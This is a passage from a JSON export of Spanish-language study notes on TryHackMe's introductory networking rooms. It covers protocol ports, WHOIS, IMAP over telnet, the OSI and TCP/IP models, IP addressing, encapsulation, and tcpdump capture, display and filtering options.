    "content": "[[THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/1. Introduction]]\n[[2. DNS- Remembering Addresses]]\n[[3. WHOIS]]\n[[4. HTTP(S) - Accessing the Web]]\n[[5. FTP - Transferring Files]]\n[[6. SMTP - Sending Email]]\n[[7. POP3 - Receiving Email]]\n[[8. IMAP - Synchronizing Email]]\n[[9. Conclusion]]\n"
  },
  {
    "title": "9. Conclusion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/9-conclusion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/9. Conclusion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "<h2>Puertos Interesantes</h2>\n\n| **Protocolo** | **Transport Protocol** | **Default Port Number** |\n| ------------- | ---------------------- | ----------------------- |\n| TELNET        | TCP                    | 23                      |\n| DNS           | UDP or TCP             | 53                      |\n| HTTP          | TCP                    | 80                      |\n| HTTPS         | TCP                    | 443                     |\n| FTP           | TCP                    | 21                      |\n| SMTP          | TCP                    | 25                      |\n| POP3          | TCP                    | 110                     |\n| IMAP          | TCP                    | 143                     |\n\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Esta habitación es la tercera de una serie de cuatro:\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n---------------\n<h2>Pre-requisitos</h2>\n[[0. Networking Concepts]]\n\n---------------\n<h2>Objetivos de aprendizaje</h2>\nEn esta lección aprenderemos sobre los siguientes protocolos:\n\n- WHOIS\n- DNS\n- HTTP y FTP\n- SMTP, POP3 e IMAP"
  },
  {
    "title": "3. WHOIS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/3-whois/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/3. WHOIS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "En la lección anterior hemos visto cómo el nombre de dominio se resuelve en una dirección IP. De todas formas, para que esto pase, alguien tiene que tener la autoridad de configurar los registros A, AAAA y MX.\n\nPuedes registrar cualquier nombre de dominio disponible  durante uno o más años. Necesitas pagar la tasa anual y se requiere que ofrezcas información de contacto detallada como el registrador. Esta información es parte de la información disponible mediante los registros WHOIS y disponible públicamente. Si quieres hacerlo de manera privada puedes recurrir a herramientas que ocultan tu información de los registros WHOIS.\n\nPuedes ver los detalles de cualquier dominio registrado haciendo `whois <dominio>`, en los sistemas Linux.\n\nAquí un ejemplo de un dominio protegido de manera privada:\n\n```bash\nuser@TryHackMe$ whois [REDACTED].com \n[...] \nDomain Name: [REDACTED].COM Registry \nDomain ID: [REDACTED] Registrar WHOIS \nServer: whois.godaddy.com Registrar \nURL: https://www.godaddy.com \nUpdated Date: 2017-07-05T16:02:43Z \nCreation Date: 1993-04-02T00:00:00Z \nRegistrar Registration Expiration Date: 2026-10-20T14:56:17Z \nRegistrar: GoDaddy.com, LLC Registrar IANA \nID: 146 Registrar \nAbuse Contact Email: abuse@godaddy.com \nRegistrar Abuse Contact Phone: +1.4806242505 \n[...] \nRegistrant Name: Registration Private \nRegistrant Organization: Domains By Proxy, LLC \nRegistrant Street: DomainsByProxy.com \n[...]\n```\n"
  },
  {
    "title": "8. IMAP - Synchronizing Email",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/3-networking-core-protocols/8-imap-synchronizing-email/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/3. Networking Core Protocols/8. IMAP - Synchronizing Email.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 3. Networking Core Protocols",
    "content": "Al trabajar con un sólo dispositivo, POP3 es suficiente. Pero ¿qué pasa si queremos ver el correo del ordenador de nuestra oficina o de nuestro portátil casero en el móvil? Necesitamos entonces un protocolo que permita la sincronización en lugar de borrarlos después de recibirlos. Una de esas soluciones es IMAP (Internet Message Access Protocol).\n\nPermite sincronizar mensajes leídos, movidos y borrados. Los comandos IMAP son más complejos:\n\n- `LOGIN <username> <password>`: Autentifica al usuario.\n- `SELECT <mailbox>`: Selecciona la bandeja de correo con la que trabajar.\n- `FETCH <mail_number> <data_item_name>`: Busca  el elemento especificado de un email (body, subject, etc.).\n- `MOVE <sequence_set> <mailbox>`: Mueve el/los email/s especificado/s a otra bandeja.\n- `COPY <sequence_set> <data_item_name>`: Copia el/los email/s especificado/s a otra bandeja.\n- `LOGOUT`: Cierra sesión.\n\nUn ejemplo de conexión a IMAP por `telnet`:\n\n```bash\nuser@TryHackMe$ telnet 10.10.41.192 143 \nTrying 10.10.41.192... \nConnected to 10.10.41.192. \nEscape character is '^]'. \n* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN] Dovecot (Ubuntu) ready. \nA LOGIN strategos \nA OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW STATUS=SIZE SAVEDATE LITERAL+ NOTIFY SPECIAL-USE] Logged in \nB SELECT inbox \n* FLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft) \n* OK [PERMANENTFLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft \\*)] Flags permitted. \n* 4 EXISTS \n* 0 RECENT \n* OK [UNSEEN 2] First unseen. \n* OK [UIDVALIDITY 1719824692] UIDs valid \n* OK [UIDNEXT 5] Predicted next UID \nB OK [READ-WRITE] Select completed (0.001 + 0.000 secs). \nC FETCH 3 body[] \n* 3 FETCH (BODY[] {445} \nReturn-path: <user@client.thm> \nEnvelope-to: strategos@server.thm \nDelivery-date: Thu, 27 Jun 2024 16:19:35 +0000 \nReceived: from [10.11.81.126] (helo=client.thm)         \n\tby example.thm with smtp (Exim 4.95)         \n\t(envelope-from <user@client.thm>)         \n\tid 1sMrpq-0001Ah-UT         \n\tfor strategos@server.thm;         \n\tThu, 27 Jun 2024 16:19:35 +0000 \nFrom: user@client.thm \nTo: strategos@server.thm \nSubject: Telnet email  \nHello. I am using telnet to send you an email! \n) \nC OK Fetch completed (0.001 + 0.000 secs). \nD LOGOUT \n* BYE Logging out D OK Logout completed (0.001 + 0.000 secs). \nConnection closed by foreign host.\n```\n\nDebajo una imagen con el servidor en azul y el cliente en rojo:\n\n![[086.png]]\n"
  },
  {
    "title": "2. OSI Model",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/2-osi-model/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/2. OSI Model.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "[[0. OSI Model]]\n"
  },
  {
    "title": "4. IP Addresses and Subnets",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/4-ip-addresses-and-subnets/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/4. IP Addresses and Subnets.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "Cuando escuchamos la palabra IP en seguida pensamos en algo como `192.168.0.1` o`172.16.159.243`. En cualquier de los casos es correcto, pero no completo.\n\nCada host en la red necesita un identificador único para que otros puedan comunicarse con él. Al usar el TCP/IP, necesitamos asignar una dirección IP para cada dispositivo conectado a la red.\n\nComo ya sabemos existen las direcciones IPv4 e IPv6. La IPv4 es la más común hasta la fecha. ¿De qué se compone? Está compuesta de 4 octetos que van del 0 al 255. El 0 y el 255 están reservados para la dirección de red y broadcast. Mandar algo a la dirección broadcast lo lleva a todos los dispositivos de la red. El problema principal de la IPv4 es que no se pueden tener algo más de 4 billones de direcciones, que parece mucho pero realmente no lo es.\n\n-------------------\n<h2>Consultar tu configuración de red</h2>\nPuedes consultar tu dirección IP en Windows MS usando el comando `ipconfig` o en Linux con el comando `ip a`. Esto nos devuelve:\n\n- Host IP.\n- Máscara de subred.\n- Dirección de broadcast.\n\nUna submáscara de red `255.255.255.0` puede escribirse como `/24`. Esto significa que los primeros 24 bits, es decir, los tres primeros octetos, no cambian.\n\n------------------------\n<h2>Direcciones Privadas</h2>\nEs útil mencionar usos prácticos. Hay dos tipos de IP: públicas y privadas. A una red privada no se puede acceder mediante una IP pública. El RFC 1918 define los siguientes rangos de IPs privadas.\n\n----------\n<h2>Routing</h2>\nUn router es un dispositivo que se encarga de redireccionar paquetes a otros routers correspondientes y así establecer una ruta entre dos IPs privadas. El router funciona en la capa 3 del modelo OSI."
  },
  {
    "title": "3. TCP-IP Model",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/3-tcp-ip-model/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/3. TCP-IP Model.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "Ahora que hemos visto el modelo conceptual ISO OSI, el momento de estudiar un modelo implementado. TCP/IP significa Tansmission Control Protocol/Internet Protocol y fue desarrollado en los años 70 por el departamento de defensa (DoD). Una de las fortalezas de este modelo es que permite a la red continuar su función incluso después de que algunas partes queden fuera de servicio. Es posible gracias a la adaptabilidad en función de la topología de la red. \n\nEn el modelo OSI, fuimos de abajo haca arriba, de 1 a 7. De cualquier forma aquí tomaremos un enfoque diferente e iremos de arriba a abajo:\n\n- Capa de aplicación: Las capas 5, 6 y 7 del modelo OSI son apiladas en la misma capa en el modelo TCP/IP.\n- Capa de transporte: Esta es la capa 4 del modelo OSI.\n- Capa de Internet: Esta es la capa 3 del modelo OSI (capa de red).\n- Capa de link: Esta es la capa dos. Alguna gente la junta con la capa física y otros no."
  },
  {
    "title": "5. UDP and TCP",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/5-udp-and-tcp/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/5. UDP and TCP.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "El protocolo IP nos permite llegar a un host de destino en la red. Este host se identifica con la dirección IP. Hay dos protocolos de transporte de información, principalmente. \n\n----------------\n<h2>UDP</h2>\n[[3. UDP-IP]]\n\n---------------\n<h2>TCP</h2>\n[[2. TCP-IP (Three-Way Handshake)]]"
  },
  {
    "title": "6. Encapsulation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/6-encapsulation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/6. Encapsulation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "Es crucial explicar otro concepto clave: la encapsulación. En este contexto, la encapsulación se refiere al proceso de a cada capa añadirle una cabecera (y a veces un pie).\n\nEn la imagen de abajo tenemos los siguientes pasos:\n\n- Información de aplicación: Cuando el usuario introduce la información que quiere mandar.\n- Segmento del protocolo de transporte: La capa de transporte, como UDP o TCP, añade información de cabecera y crea el TCP segment o UDP datagram.\n- Paquete de red: La capa de red añade cabecera IP al segmento o datagram recibido, entonces, este paquete IP es mandado a la capa siguiente.\n- Marco de data link: El Ethernet o la WiFi recibe el paquete IP y le añade su correspondiente cabecera y pie, creando el marco.\n\nEmpezamos con la aplicación a enviar, en la capa de transporte añadimos TCP o UDP header. En la capa de red añadimos el IP header. Finalmente añadimos un header y un trailer para encapsular la información en un marco.\n\n![[5f04259cf9bf5b57aed2c476-1719849061418.jpg]]\n\n---------------------\n<h2>La vida de un paquete</h2>\nBasado en lo que hemos estudiado hasta el momento, podemos explicar de manera simplificada la vida de un paquete. Consideremos un escenario en el que buscamos una habitación en TryHackMe.\n\n1. En la página de TryHackMe introducimos una query y le damos a buscar.\n2. El buscador web, usando HTTPS, prepara una petición HTTP y la manda a la capa debajo, la capa de transporte.\n3. La capa TCP necesita establecer una conexión vía three-way handshake entre tu buscador y el servidor de TryHackMe. Después de que sea establecida, manda la petición que contiene la query.\n4. El la capa de red, la IP fuente es añadida y después mandado a la capa inferior, la capa de link.\n5. Dependiendo del protocolo, se añade los correspondientes header y trailer y se manda al router.\n6. El router elimina el header de la capa de link inspecciona la IP de destino y lo manda al próximo router. Cada router repite este proceso hasta que llega a su destino.\n\nLos pasos son invertidos después para volver a tu bnuscador."
  },
  {
    "title": "7. Telnet",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/7-telnet/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/7. Telnet.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "TELNET (TELetype NETwork) es un protocolo de red para conexión remota a consolas. Es decir, `telnet` es una herramienta que nos permite comunicarnos con un sistema remoto y escribir comandos.\n\nEn la máquina a la que nos vamos a conectar hay varios servicios corriendo, nos centraremos en tres:\n\n- Servidor echo: Este servidor repite todo lo que le dices, por defecto opera en el puerto 7.\n- Servidor daytime: Este servidor escucha en el puerto 13 por defecto y responde con la hora y día actuales.\n- Servidor web (HTTP): Escucha en el puerto 80 por defecto y hostea páginas web.\n\nAntes de continuar deberíamos mencionar que los servidores echo y daytime son considerados factores críticos de seguridad y no deberían ejecutarse. De cualquier forma los hemos conectado para ver su utilidad.\n\nCon telnet nos conectamos al puerto que nos interese, por ejemplo el echo (7) con `telnet <ip> <puerto>`. Para cerrar la conexión usamos `Ctrl + ]`.\n\n![[71.png]]"
  },
  {
    "title": "0. Networking Concepts",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/0-networking-concepts/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/0. Networking Concepts.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/1. Introduction]]\n[[2. OSI Model]]\n[[3. TCP-IP Model]]\n[[4. IP Addresses and Subnets]]\n[[5. UDP and TCP]]\n[[6. Encapsulation]]\n[[7. Telnet]]"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/1-networking-concepts/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/1. Networking Concepts/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 1. Networking Concepts",
    "content": "¿Alguna vez te has preguntado por qué necesitas una dirección IP para entrar a Internet? ¿Es verdad que una dirección IP identifica a un único usuario? ¿Sabes cómo el la vida de un paquete? Comencemos.\n\nEsta es la primera de una serie de lecciones sobre el networking:\n\n- [[0. Networking Concepts]]\n- [[0. Networking Essentials]]\n- [[0. Networking Core Protocols]]\n- [[0. Networking Secure Protocols]]\n\n----------------------\n<h2>Pre-requisitos</h2>\n[[2. Network Fundamentals]]\n\n<h2>Objetivos de aprendizaje</h2>\nPara cuando termines esta unidad habrás aprendido:\n\n- ISO OSI network model.\n- Direcciones IP, subredes y routing.\n- TCP, UDP, y números de puertos.\n- Cómo conectarse a un puerto TCP abierto desde consola."
  },
  {
    "title": "2. Basic Packet Capture",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/2-basic-packet-capture/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/2. Basic Packet Capture.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "Puedes ejecutar `tcpdump` sin dar parámetros, sin embargo, esto sólo es útil para comprobar que está instalado.\n\n--------------\n<h2>Especificar la Interfaz de Red</h2>\nLo primero que debemos decidir es qué interfaz de red escuchar usando `-i <interface>`. Podemos elegir usar todas con `-i any`.\n\n---------------------\n<h2>Guardar los Paquetes Capturados</h2>\nEn muchos casos, querremos acceder a los paquetes con posterioridad. Esto puede hacerse usando `-w <file>`. La extensión más común es `.pcap`. No verás los paquete en la pantalla al usar esta opción. Algo a tener en cuenta para guardar los paquetes es que deberemos ser `root` o ejecutar el comando con `sudo`.\n\n-------------\n<h2>Leer Paquetes Capturados de un Archivo</h2>\nPodemos leer los paquetes con tcpdump usando `-r <file>`. Es muy útil para aprender sobre el comportamiento de protocolos. Puedes capturar el tráfico de red durante un tiempo para un protocolo determinado.\n\n--------------------\n<h2>Limitar el número de Paquetes Capturados</h2>\nPuedes especificar el número de paquetes capturados especificando la cuenta con `-c <count>`. Sin especificar, la captura continuará hasta ser interrumpida por ejemplo con `Ctrl + C`.\n\n--------------------\n<h2>No Resolver Direcciones IP y Números de Puertos</h2>\nTcpdump resolverá direcciones IP y mostrará nombres de dominio donde sea posible. Para evitar esto se puede usar el argumento `-n`. Si además no quieres que el puerto 80 sea interpretado como http, puedes usar `-nn` para evitar la resolución de ambos.\n\n------------------\n<h2>Producir (más) Verbose</h2>\nSi quieres mostrar más detalles sobre los paquetes puedes usar `-v` para producir un poquito más de verbose. Los argumentos `-vv` y `-vvv` producirán más verbose incremental.\n\n-------------\n<h2>Resumen y Ejemplos</h2>\n\n| Comando                | Explicación                                                             |\n| ---------------------- | ----------------------------------------------------------------------- |\n| `tcpdump -i INTERFACE` | Captura paquetes de una interfaz de red determinada (`any` para todas). |\n| `tcpdump -w FILE`      | Escribe los paquetes capturados en un archivo.                          |\n| `tcpdump -r FILE`      | Lee los paquetes capturados desde un archivo.                           |\n| `tcpdump -c COUNT`     | Captura un número específico de paquetes.                               |\n| `tcpdump -n`           | No resuelve direcciones IP.                                             |\n| `tcpdump -nn`          | No resuelve direcciones IP ni puertos.                                  |\n| `tcpdump -v`           | Muestra más detalles (`-vv` y `-vvv` muestran todavía más).             |\n\n- `tcpdump -i eth0 -c 50 -v`: Captura y muestra 50 paquetes escuchando `eth0` y los muestra con un poco más de información.\n- `tcpdump -i wlo1 -w data.pcap`: Captura paquetes hasta ser interrumpido con `Ctrl + C` escuchando en `wlo1` y los guarda en el archivo `data.pcap`.\n- `tcpdump -i any -nn`: Captura paquetes hasta que sea parado de todas las interfaces de red disponibles y elimina la resolución de direcciones IP y puertos."
  },
  {
    "title": "0. Tcpdump - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/0-tcpdump-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/0. Tcpdump - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/1. Introduction]]\n[[2. Basic Packet Capture]]\n[[3. Filtering Expressions]]\n[[4. Advanced Filtering]]\n[[5. Displaying Packets]]\n"
  },
  {
    "title": "5. Displaying Packets",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/5-displaying-packets/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/5. Displaying Packets.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "Tcpdump es un programa rico con muchas opciones para personalizar cómo los paquetes se muestran. Hemos seleccionado las siguientes opciones para enseñar:\n\n- `-q`: Rápido (quick), muestra información resumida.\n- `-e`: Muestra el header de link-level.\n- `-A`: Muestra la información del paquete en ASCII.\n- `-xx`: Muestra la información del paquete en formato hexadecimal.\n- `-X`: Muestra los headers y la información en hexadecimal y ASCII.\n\n---------------------\n<h2>Información de Paquete Reducida</h2>\nSi prefieres lineas más reducidas la opción `-q` es ideal. Se muestra algo así:\n\n```bash\nuser@TryHackMe$ tcpdump -r TwoPackets.pcap -q \nreading from file TwoPackets.pcap, link-type EN10MB (Ethernet), snapshot length 262144 \n18:59:59.979771 IP 104.18.12.149.https > g5000.45248: tcp 25 \n18:59:59.980574 IP g5000.45248 > 104.18.12.149.https: tcp 29\n```\n\n------------------\n<h2>Mostrando la Cabecera Link-Level</h2>\nSi estás en una red WiFi o Ethernet y quieres incluir las direcciones MAC, todo lo que necesitas hacer es `-e`.\n\n```bash\nuser@TryHackMe$ tcpdump -r TwoPackets.pcap -e \nreading from file TwoPackets.pcap, link-type EN10MB (Ethernet), snapshot length 262144 \n18:59:59.979771 44:df:65:d8:fe:6c (oui Unknown) > 02:83:1e:40:5d:17 (oui Unknown), ethertype IPv4 (0x0800), length 91: 104.18.12.149.https > g5000.45248: Flags [P.], seq 2695955324:2695955349, ack 2856007037, win 16, options [nop,nop,TS val 412758285 ecr 3959057198], length 25 \n18:59:59.980574 02:83:1e:40:5d:17 (oui Unknown) > 44:df:65:d8:fe:6c (oui Unknown), ethertype IPv4 (0x0800), length 95: g5000.45248 > 104.18.12.149.https: Flags [P.], seq 1:30, ack 25, win 2175, options [nop,nop,TS val 3959057384 ecr 412758285], length 29\n```\n\n-----------------\n<h2>Mostrando Paquetes en ASCII</h2>\nASCII significa American Standard Code for Information Interchange, representa texto. Convierte los bytes a símbolos del alfabeto inglés.\n\n```bash\nuser@TryHackMe$ tcpdump -r TwoPackets.pcap -A \nreading from file TwoPackets.pcap, link-type EN10MB (Ethernet), snapshot length 262144 \n18:59:59.979771 IP 104.18.12.149.https > g5000.45248: Flags [P.], seq 2695955324:2695955349, ack 2856007037, win 16, options [nop,nop,TS val 412758285 ecr 3959057198], length 25 \nE..M..@.5..)h.....BY.......|.;5}........... ..1...k......j.3.2.....&9a.....-L\n18:59:59.980574 IP g5000.45248 > 104.18.12.149.https: Flags [P.], seq 1:30, ack 25, win 2175, options [nop,nop,TS val 3959057384 ecr 412758285], length 29\nE..Ql.@.@.VV..BYh........;5}............... ..k...1.......1.y.&VC<#._J$..z...D#.`\n```\n\n-----------\n<h2>Mostrando Paquetes en Formato Hexadecimal</h2>\nEl formato ASCII funciona bien cuando el contenido es texto en inglés, pero no funcionará si ha sido encriptado o comprimido. Aquí entra en juego el hexadecimal. Para ello usamos `-xx`.\n\n ```bash\n user@TryHackMe$ tcpdump -r TwoPackets.pcap -xx \n reading from file TwoPackets.pcap, link-type EN10MB (Ethernet), snapshot length 262144 \n 18:59:59.979771 IP 104.18.12.149.https > g5000.45248: Flags [P.], seq 2695955324:2695955349, ack 2856007037, win 16, options [nop,nop,TS val 412758285 ecr 3959057198], length 25         \n\t 0x0000:  0283 1e40 5d17 44df 65d8 fe6c 0800 4500         \n\t 0x0010:  004d fbd8 4000 3506 d229 6812 0c95 c0a8         \n\t 0x0020:  4259 01bb b0c0 a0b1 037c aa3b 357d 8018         \n\t 0x0030:  0010 f905 0000 0101 080a 189a 310d ebfa         \n\t 0x0040:  6b2e 1703 0300 146a 8f33 1832 e6a2 fb99         \n\t 0x0050:  eb26 3961 dad4 1611 152d 4c \n18:59:59.980574 IP g5000.45248 > 104.18.12.149.https: Flags [P.], seq 1:30, ack 25, win 2175, options [nop,nop,TS val 3959057384 ecr 412758285], length 29         \n\t0x0000:  44df 65d8 fe6c 0283 1e40 5d17 0800 4500         \n\t0x0010:  0051 6ca8 4000 4006 5656 c0a8 4259 6812         \n\t0x0020:  0c95 b0c0 01bb aa3b 357d a0b1 0395 8018         \n\t0x0030:  087f 17e0 0000 0101 080a ebfa 6be8 189a         \n\t0x0040:  310d 1703 0300 18f4 31fa 798d 2656 433c         \n\t0x0050:  2389 5f4a 24c2 fa7a 1496 8444 238e 60\n ```\n\n----------------\n<h2>Lo Mejor de Ambos Mundos</h2>\nSi quieres mostrarlo en hexadecimal y ASCII, usa `-X`.\n\n-------------\n<h2>Resumen y Ejemplos</h2>\nUna tabla con algunos comandos aprendidos:\n\n| Comando       | Explicación                                  |\n| ------------- | -------------------------------------------- |\n| `tcpdump -q`  | Información resumida.                        |\n| `tcpdump -e`  | Añade dirección MAC.                         |\n| `tcpdump -A`  | Muestra el contenido en ASCII.               |\n| `tcpdump -xx` | Muestra el contenido en hexadecimal.         |\n| `tcpdump -X`  | Muestra el contenido en hexadecimal y ASCII. |\n"
  },
  {
    "title": "4. Advanced Filtering",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/4-advanced-filtering/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/4. Advanced Filtering.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
    "content": "Hay muchas más maneras de filtrar paquetes.  En una situación real puede que necesitemos filtrar entre miles o millones de paquetes. Es indispensable poder expresar exactamente qué paquetes mostrar. Por ejemplo aquellos mayores o menores de un cierto tamaño:\n\n- `greater <length>`: Filtra paquetes que tienen una longitud superior a la establecida.\n- `less <length>`: Filtra paquetes que tienen una longitud menor a la establecida.\n\nEs recomendable consultar la página de manual de `pcap-filter` usando `man pcap-filter`. De todas formas, nos centraremos en filtrar basándonos en las flags TCP.\n\n------------\n<h2>Operaciones Binarias</h2>\nUna operación binaria trabaja en bits. Esta coge dos bits como entrada (0 o 1) y devuelve un solo bit. A continuación una tabla:\n\n| Input 1 | Input 2 | & (and) | \\| (or) |\n| ------- | ------- | ------- | ------- |\n| 0       | 0       | 0       | 0       |\n| 0       | 1       | 0       | 1       |\n| 1       | 0       | 0       | 1       |\n| 1       | 1       | 1       | 1       |\n\n| Input 1 | ! (not) |\n| ------- | ------- |\n| 0       | 1       |\n| 1       | 0       |\n\n------------------\n<h2>Header Bytes</h2>\nEl objetivo de este apartado es aprender a filtrar paquetes en función de los contenidos de un header byte. Consideremos los protocolos estudiados: ARP; Ethernet, ICMP, IP, TCP y UDP.\n\nUsando `pcap-filter`, tcpdump permite referirnos a los contenidos de cualquier byte header usando la siguiente sintaxis: `proto[expr:size]`.\n\n- `proto`: Refiere el protocolo (`arp`, `eter`, `icmp`, `ip`, `ip6`, `tcp`, `udp`).\n- `expr`: Indica el byte offset, donde `0` se refiere al primer byte.\n- `size`: Indica el número de bytes que nos interesa. Es `1` por defecto.\n\nConsideremos los siguientes ejemplos:\n\n- `ether[0] & 1 != 0`: Coge el primer byte en el header `Ethernet` y el número decimal 1 y retorna `True` siempre que el resultado sea distinto de 0. El propósito de este filtro es mostrar paquetes que hayan sido mandados a una dirección multicast (una dirección que identifica a un grupo  de dispositivos en una red).\n- `ip[0] & 0xf != 5`: Coge el primer byte del header `ip` y lo compara con el número hexadecimal F (15). Devuelve `True` si el resultado no es igual al numero decimal 5. El propósito de este filtro es coger todos los paquetes IP con opciones.\n\nEstos ejemplos son complicados y no es necesario entenderlos completamente. Podemos usar `tcp[tcpflags]` para referirnos al campo de las flags. Aquí algunas flags:\n\n- `tcp-syn`: TCP SYN (Sincronizar).\n- `tcp-ack`: TCP ACK (Reconocer).\n- `tcp-fin`: TCP FIN (Finalizar).\n- `tcp-rst`: TCP RST (Resetear).\n- `tcp-push`: TCP Push\n\nBasado en lo de arriba, podemos escribir:\n\n- `tcpdump \"tcp[tcpflags] == tcp-syn\"`: Para capturar paquetes TCP sólo con la flag SYN establecida.\n- `tcpdump \"tcp[tcpflags] & tcp-syn != 0\"`: Para capturar paquetes TCP con **al menos** la flag SYN establecida.\n- `tcpdump \"tcp[tcpflags] & (tcp-syn | tcp-ack) != 0\"`: Para capturar paquetes TCP con **al menos** la flag SYN o ACK establecidas.\n\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/6-tcpdump-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/6. Tcpdump - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking > 6. Tcpdump - The Basics",
